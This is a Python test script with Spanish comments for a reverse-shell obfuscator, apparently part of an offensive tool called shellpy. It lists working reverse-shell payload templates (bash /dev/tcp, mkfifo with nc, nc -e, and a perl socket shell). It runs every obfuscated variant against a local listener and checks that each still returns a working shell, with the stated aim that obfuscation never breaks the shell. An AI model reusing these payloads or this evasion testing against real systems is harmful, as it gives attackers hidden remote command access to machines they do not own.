#!/usr/bin/env python3
"""Validacion del ofuscador de bash y perl.

Cada variante que produce shobfuscator.py se ejecuta de verdad contra un
listener local: se comprueba que conecta y que devuelve la salida de `whoami`.
Una variante que no da shell no sirve de nada por muy ofuscada que este.

Uso:  python3 tests/test_sh_obfuscation.py
"""

import os
import shutil
import socket
import subprocess
import sys
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

from shobfuscator import obfuscateBash, obfuscatePerl  # noqa: E402

IP = "127.0.0.1"
FIRST_PORT = 4700

# Los payloads tal y como los emite shellpy, con {ip} y {port} sin sustituir.
CASES = [
    ("bash /dev/tcp", obfuscateBash, "/bin/bash",
     "bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
    ("bash fifo+nc", obfuscateBash, "/bin/bash",
     "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"),
    ("bash nc -e", obfuscateBash, "/bin/bash",
     "nc {ip} {port} -e /bin/sh"),
    ("perl", obfuscatePerl, "/bin/sh",
     'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,'
     'getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))'
     '{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
     'exec("/bin/sh -i");};\''),
]


def listener(port, result):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((IP, port))
    s.listen(1)
    s.settimeout(15)
    try:
        conn, _ = s.accept()
    except socket.timeout:
        result.append("no conecto")
        s.close()
        return
    conn.settimeout(6)
    time.sleep(0.6)
    try:
        conn.send(b"whoami\n")
    except OSError:
        pass
    buf = b""
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            buf += chunk
    except (socket.timeout, OSError):
        pass
    expected = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
    result.append("ok" if expected.encode() in buf else "sin salida de whoami")
    conn.close()
    s.close()


def trial(payload, port, shellBin):
    result = []
    t = threading.Thread(target=listener, args=(port, result))
    t.start()
    time.sleep(0.8)
    try:
        subprocess.run(payload, shell=True, timeout=12, executable=shellBin,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.TimeoutExpired:
        pass
    t.join(20)
    return result[0] if result else "sin resultado"


def main():
    for tool in ("nc", "perl"):
        if not shutil.which(tool):
            print(f"falta {tool}, no se puede validar: se omite el test")
            return 0

    port = FIRST_PORT
    failures = []
    for label, fn, shellBin, template in CASES:
        base = template.replace("{ip}", IP).replace("{port}", str(port))
        count = len(fn(base, IP, port))
        print(f"\n== {label}: {count} variantes")
        for idx in range(count):
            base = template.replace("{ip}", IP).replace("{port}", str(port))
            name, payload = fn(base, IP, port)[idx]
            status = trial(payload, port, shellBin)
            print(f"  [{status:20}] {name}")
            if status != "ok":
                failures.append(f"{label} / {name}: {status}")
            port += 1

    print()
    if failures:
        print(f"FALLOS ({len(failures)}):")
        for f in failures:
            print("  - " + f)
        return 1
    print("OK: todas las variantes devolvieron shell")
    return 0


if __name__ == "__main__":
    sys.exit(main())
